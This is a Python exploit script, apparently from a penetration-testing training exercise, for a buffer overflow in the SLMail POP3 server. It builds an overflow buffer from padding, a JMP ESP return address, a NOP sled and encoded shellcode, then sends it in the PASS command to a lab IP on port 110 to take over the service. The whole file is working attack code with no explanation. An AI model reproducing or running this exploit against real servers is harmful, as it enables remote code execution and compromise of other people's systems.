# PART 6: Safe payload without crashing SLMail

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

jmp_esp_addr = "\x8f\x35\x4a\x5f"

shellcode = ("\xbe\xd7\x89\xc8\xc4\xdb\xdd\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x83\xc2\x04\x31\x72\x0e\x03\xa5\x87\x2a\x31\xb5\x70\x28"
"\xba\x45\x81\x4d\x32\xa0\xb0\x4d\x20\xa1\xe3\x7d\x22\xe7\x0f"
"\xf5\x66\x13\x9b\x7b\xaf\x14\x2c\x31\x89\x1b\xad\x6a\xe9\x3a"
"\x2d\x71\x3e\x9c\x0c\xba\x33\xdd\x49\xa7\xbe\x8f\x02\xa3\x6d"
"\x3f\x26\xf9\xad\xb4\x74\xef\xb5\x29\xcc\x0e\x97\xfc\x46\x49"
"\x37\xff\x8b\xe1\x7e\xe7\xc8\xcc\xc9\x9c\x3b\xba\xcb\x74\x72"
"\x43\x67\xb9\xba\xb6\x79\xfe\x7d\x29\x0c\xf6\x7d\xd4\x17\xcd"
"\xfc\x02\x9d\xd5\xa7\xc1\x05\x31\x59\x05\xd3\xb2\x55\xe2\x97"
"\x9c\x79\xf5\x74\x97\x86\x7e\x7b\x77\x0f\xc4\x58\x53\x4b\x9e"
"\xc1\xc2\x31\x71\xfd\x14\x9a\x2e\x5b\x5f\x37\x3a\xd6\x02\x50"
"\x8f\xdb\xbc\xa0\x87\x6c\xcf\x92\x08\xc7\x47\x9f\xc1\xc1\x90"
"\xe0\xfb\xb6\x0e\x1f\x04\xc7\x07\xe4\x50\x97\x3f\xcd\xd8\x7c"
"\xbf\xf2\x0c\xd2\xef\x5c\xff\x93\x5f\x1d\xaf\x7b\xb5\x92\x90"
"\x9c\xb6\x78\xb9\x37\x4d\xeb\xcc\xcc\x4d\xd4\xb8\xd0\x4d\x2b"
"\x82\x5c\xab\x41\xe4\x08\x64\xfe\x9d\x10\xfe\x9f\x62\x8f\x7b"
"\x9f\xe9\x3c\x7c\x6e\x1a\x48\x6e\x07\xea\x07\xcc\x8e\xf5\xbd"
"\x78\x4c\x67\x5a\x78\x1b\x94\xf5\x2f\x4c\x6a\x0c\xa5\x60\xd5"
"\xa6\xdb\x78\x83\x81\x5f\xa7\x70\x0f\x5e\x2a\xcc\x2b\x70\xf2"
"\xcd\x77\x24\xaa\x9b\x21\x92\x0c\x72\x80\x4c\xc7\x29\x4a\x18"
"\x9e\x01\x4d\x5e\x9f\x4f\x3b\xbe\x2e\x26\x7a\xc1\x9f\xae\x8a"
"\xba\xfd\x4e\x74\x11\x46\x6e\x97\xb3\xb3\x07\x0e\x56\x7e\x4a"
"\xb1\x8d\xbd\x73\x32\x27\x3e\x80\x2a\x42\x3b\xcc\xec\xbf\x31"
"\x5d\x99\xbf\xe6\x5e\x88")

string = "A"*2606 + jmp_esp_addr + "\x90"*16 + shellcode + "C"*(3500 - 2606 - 4 - 16 - 351)

try:
	print("Sending evil buffer...")
	connect = s.connect(('10.11.22.75', 110))
	data = s.recv(1024)
	s.send("USER username" + "\r\n")
	data = s.recv(1024)
	s.send("PASS {}".format(string) + "\r\n")
	s.close()
	print("\nDone")
except Exception as e:
	print(e)

